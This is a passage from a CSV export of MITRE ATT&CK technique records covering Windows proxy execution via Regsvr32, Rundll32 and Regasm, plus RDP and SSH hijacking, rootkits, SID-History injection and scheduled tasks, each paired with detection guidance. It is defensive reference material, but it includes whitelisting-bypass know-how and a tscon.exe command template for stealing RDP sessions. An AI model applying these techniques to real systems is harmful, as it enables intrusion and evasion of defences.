Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: `[ComRegisterFunction]` or `[ComUnregisterFunction]` respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

Detection: Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

Platforms: Windows

Data Sources: Process monitoring, Process command-line parameters

Defense Bypassed: Process whitelisting

Permissions Required: User, Administrator

Remote Support: No

Contributors: Casey Smith","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1121', 'external_id': 'T1121'}, {'source_name': 'MSDN Regsvcs', 'description': 'Microsoft. (n.d.). Regsvcs.exe (.NET Services Installation Tool). Retrieved July 1, 2016.', 'url': 'https://msdn.microsoft.com/en-us/library/04za0hca.aspx'}, {'source_name': 'MSDN Regasm', 'description': 'Microsoft. (n.d.). Regasm.exe (Assembly Registration Tool). Retrieved July 1, 2016.', 'url': 'https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx'}, {'source_name': 'SubTee GitHub All The Things Application Whitelisting Bypass', 'description': '[ Smith, C. (2016, August 17). Includes 5 Known Application Whitelisting/ Application Control Bypass Techniques in One File. Retrieved June 30, 2017.'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'Process command-line parameters']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Casey Smith']","","","False","","['Process whitelisting']"
"attack-pattern","attack-pattern--68f7e3a1-f09f-4164-9a62-16b648a0dd5a","2017-05-31T21:31:26.966Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Regsvr32","Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique has been used in campaigns targeting governments. (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Detection: Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.

Platforms: Windows

Data Sources: Loaded DLLs, Process monitoring, Process command-line parameters, Windows Registry

Defense Bypassed: Process whitelisting, Anti-virus

Permissions Required: User, Administrator

Remote Support: No

Contributors: Casey Smith","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1117', 'external_id': 'T1117'}, {'source_name': 'Microsoft Regsvr32', 'description': 'Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.', 'url': 'https://support.microsoft.com/en-us/kb/249873'}, {'source_name': 'SubTee Regsvr32 Whitelisting Bypass', 'description': '[ Smith, C. (2016, April 19). Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files). Retrieved June 30, 2017.'}, {'source_name': 'FireEye Regsvr32 Targeting Mongolian Gov', 'description': 'Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.', 'url': 'https://www.fireeye.com/blog/threat-research/2017/02/spear%20phishing%20techn.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Loaded DLLs', 'Process monitoring', 'Process command-line parameters', 'Windows Registry']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Casey Smith']","","","False","","['Process whitelisting', 'Anti-virus']"
"attack-pattern","attack-pattern--51dea151-0898-4a45-967c-3ebee0420484","2017-05-31T21:30:59.769Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Remote Desktop Protocol","Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS.

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features technique for Persistence. (Citation: Alperovitch Malware)

Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)

Detection: Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

Also, set up process monitoring for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to prevent RDP session hijacking.

Platforms: Windows

Data Sources: Authentication logs, Netflow/Enclave netflow, Process monitoring

Permissions Required: User, Remote Desktop Users

System Requirements: RDP service enabled, account in the Remote Desktop Users group.

Contributors: Matthew Demaske, Adaptforward","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1076', 'external_id': 'T1076'}, {'source_name': 'TechNet Remote Desktop Services', 'description': 'Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.', 'url': 'https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx'}, {'source_name': 'Alperovitch Malware', 'description': 'Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014.', 'url': 'http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/'}, {'source_name': 'RDP Hijacking Korznikov', 'description': 'Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017.', 'url': 'http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html'}, {'source_name': 'RDP Hijacking Medium', 'description': 'Beaumont, K. (2017, March 19). RDP hijacking\u200a—\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017.', 'url': 'https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6'}, {'source_name': 'Kali Redsnarf', 'description': 'NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017.', 'url': 'https://github.com/nccgroup/redsnarf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']","['User', 'Remote Desktop Users']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Matthew Demaske, Adaptforward']","","['RDP service enabled, account in the Remote Desktop Users group.']","","",""
"attack-pattern","attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add","2017-05-31T21:31:16.408Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Remote File Copy","Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with Windows Admin Shares or Remote Desktop Protocol.

Detection: Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Packet capture, Process use of network, Netflow/Enclave netflow, Network protocol analysis, Process monitoring

Permissions Required: User

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1105', 'external_id': 'T1105'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']","['User']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba","2017-05-31T21:30:29.858Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Remote Services","An adversary may use Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.

Detection: Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement.

Platforms: Linux, macOS, Windows

Data Sources: Authentication logs

System Requirements: Active remote service accepting connections and valid credentials","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1021', 'external_id': 'T1021'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Active remote service accepting connections and valid credentials']","","",""
"attack-pattern","attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735","2017-05-31T21:30:28.187Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Remote System Discovery","Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. 

===Windows===

Examples of tools and commands that acquire this information include ""ping"" or ""net view"" using Net.

===Mac===

Specific to Mac, the `bonjour` protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as ""ping"" and others can be used to gather information about remote systems.

===Linux===

Utilities such as ""ping"" and others can be used to gather information about remote systems.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: Network protocol analysis, Process command-line parameters, Process monitoring, Process use of network

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1018', 'external_id': 'T1018'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']","['User', 'Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4","2017-05-31T21:31:08.977Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Replication Through Removable Media","Adversaries may move to additional systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into another system and executes. This may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system.

Detection: Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.

Platforms: Windows

Data Sources: File monitoring, Data loss prevention

Permissions Required: User

System Requirements: Removable media allowed, Autorun enabled or vulnerability present that allows for code execution","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1091', 'external_id': 'T1091'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Data loss prevention']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']","","",""
"attack-pattern","attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b","2017-05-31T21:30:26.496Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Rootkit","Rootkits are programs that hide the existence of malware by intercepting (i.e., Hooking) and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a Hypervisor, Master Boot Record, or the System Firmware. (Citation: Wikipedia Rootkit)

Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)

Detection: Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)

Platforms: Linux, macOS, Windows

Data Sources: BIOS, MBR, System calls

Defense Bypassed: Anti-virus, File monitoring, Host intrusion prevention systems, Process whitelisting, Signature-based detection, System access controls, Whitelisting by file name or path

Permissions Required: Administrator, SYSTEM, root","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1014', 'external_id': 'T1014'}, {'source_name': 'Wikipedia Rootkit', 'description': 'Wikipedia. (2016, June 1). Rootkit. Retrieved June 2, 2016.', 'url': 'https://en.wikipedia.org/wiki/Rootkit'}, {'source_name': 'Symantec Windows Rootkits', 'description': 'Symantec. (n.d.). Windows Rootkit Overview. Retrieved December 21, 2017.', 'url': 'https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf'}, {'source_name': 'CrowdStrike Linux Rootkit', 'description': 'Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.', 'url': 'https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/'}, {'source_name': 'BlackHat Mac OSX Rootkit', 'description': ""Pan, M., Tsai, S. (2014). You can’t see me: A Mac OS X Rootkit uses the tricks you haven't known yet. Retrieved December 21, 2017."", 'url': 'http://www.blackhat.com/docs/asia-14/materials/Tsai/WP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['BIOS', 'MBR', 'System calls']","['Administrator', 'SYSTEM', 'root']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Process whitelisting', 'Signature-based detection', 'System access controls', 'Whitelisting by file name or path']"
"attack-pattern","attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5","2017-05-31T21:31:06.045Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Rundll32","The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Detection: Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.

Platforms: Windows

Data Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring

Defense Bypassed: Anti-virus, Application whitelisting

Permissions Required: User

Remote Support: No

Contributors: Ricardo Dias","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1085', 'external_id': 'T1085'}, {'source_name': 'Trend Micro CPL', 'description': 'Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.', 'url': 'https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Ricardo Dias']","","","False","","['Anti-virus', 'Application whitelisting']"
"attack-pattern","attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","SID-History Injection","The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID)-History Attribute, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

Adversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, Windows Admin Shares, or Windows Remote Management.

Detection: Examine data in user’s SID-History attributes using the PowerShell Get-ADUser Cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015)

Monitor Account Management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015)  (Citation: Microsoft DsAddSidHistory)

Monitor Windows API calls to the `DsAddSidHistory` function. (Citation: Microsoft DsAddSidHistory)

Platforms: Windows

Data Sources: API monitoring, Authentication logs, Windows event logs

Permissions Required: Administrator, SYSTEM

Contributors: Vincent Le Toux","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1178', 'external_id': 'T1178'}, {'source_name': 'Microsoft SID', 'description': 'Microsoft. (n.d.). Security Identifiers. Retrieved November 30, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx'}, {'source_name': 'Microsoft Well Known SIDs Jun 2017', 'description': 'Microsoft. (2017, June 23). Well-known security identifiers in Windows operating systems. Retrieved November 30, 2017.', 'url': 'https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems'}, {'source_name': 'Microsoft Get-ADUser', 'description': 'Microsoft. (n.d.). Active Directory Cmdlets - Get-ADUser. Retrieved November 30, 2017.', 'url': 'https://technet.microsoft.com/library/ee617241.aspx'}, {'source_name': 'AdSecurity SID History Sept 2015', 'description': 'Metcalf, S. (2015, September 19). Sneaky Active Directory Persistence #14: SID History. Retrieved November 30, 2017.', 'url': 'https://adsecurity.org/?p=1772'}, {'source_name': 'Microsoft DsAddSidHistory', 'description': 'Microsoft. (n.d.). Using DsAddSidHistory. Retrieved November 30, 2017.', 'url': 'https://msdn.microsoft.com/library/ms677982.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Authentication logs', 'Windows event logs']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Vincent Le Toux']","","","","",""
"attack-pattern","attack-pattern--c1b11bf7-c68e-4fbf-a95b-28efbe7953bb","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","SSH Hijacking","Secure Shell (SSH) is a standard means of remote access on Linux and Mac systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.

In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)

SSH Hijacking differs from use of Remote Services because it injects into an existing SSH session rather than creating a new session using Valid Accounts.

Detection: Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.

Platforms: Linux, macOS

Data Sources: Authentication logs

Permissions Required: User, root

System Requirements: SSH service enabled, trust relationships configured, established connections

Contributors: Anastasios Pingios","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1184', 'external_id': 'T1184'}, {'source_name': 'Slideshare Abusing SSH', 'description': 'Duarte, H., Morrison, B. (2012). (Mis)trusting and (ab)using ssh. Retrieved January 8, 2018.', 'url': 'https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219'}, {'source_name': 'SSHjack Blackhat', 'description': 'Adam Boileau. (2005, August 5). Trust Transience:  Post Intrusion SSH Hijacking. Retrieved December 19, 2017.', 'url': 'https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf'}, {'source_name': 'Clockwork SSH Agent Hijacking', 'description': 'Beuchler, B. (2012, September 28). SSH Agent Hijacking. Retrieved December 20, 2017.', 'url': 'https://www.clockwork.com/news/2012/09/28/602/ssh%20agent%20hijacking'}, {'source_name': 'Welivesecurity Ebury SSH', 'description': 'M.Léveillé, M. (2014, February 21). An In-depth Analysis of Linux/Ebury. Retrieved January 8, 2018.', 'url': 'https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs']","['User', 'root']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Anastasios Pingios']","","['SSH service enabled, trust relationships configured, established connections']","","",""
"attack-pattern","attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9","2017-05-31T21:30:46.977Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Scheduled Task","Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. The account used to create the task must be in the Administrators group on the local system. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. (Citation: TechNet Task Scheduler Security)

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

Detection: Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the `svchost.exe` in Windows 10 and the Windows Task Scheduler `taskeng.exe` for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in `%systemroot%\System32\Tasks` for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Configure event logging for scheduled task creation and changes by enabling the ""Microsoft-Windows-TaskScheduler/Operational"" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)

*Event ID 106 - Scheduled task registered
*Event ID 140 - Scheduled task updated
*Event ID 141 - Scheduled task removed

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

Platforms: Windows

Data Sources: File monitoring, Process command-line parameters, Process monitoring, Windows event logs

Effective Permissions: Administrator, SYSTEM

Permissions Required: Administrator, SYSTEM

Remote Support: Yes

Contributors: Travis Smith, Tripwire, Leo Loobeek, @leoloobeek","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1053', 'external_id': 'T1053'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}, {'source_name': 'TechNet Forum Scheduled Task Operational Setting', 'description': 'Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.', 'url': 'https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen'}, {'source_name': 'TechNet Scheduled Task Events', 'description': 'Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.', 'url': 'https://technet.microsoft.com/library/dd315590.aspx'}, {'source_name': 'TechNet Task Scheduler Security', 'description': 'Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/cc785125.aspx'}, {'source_name': 'Twitter Leoloobeek Scheduled Task', 'description': 'Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.', 'url': 'https://twitter.com/leoloobeek/status/939248813465853953'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process command-line parameters', 'Process monitoring', 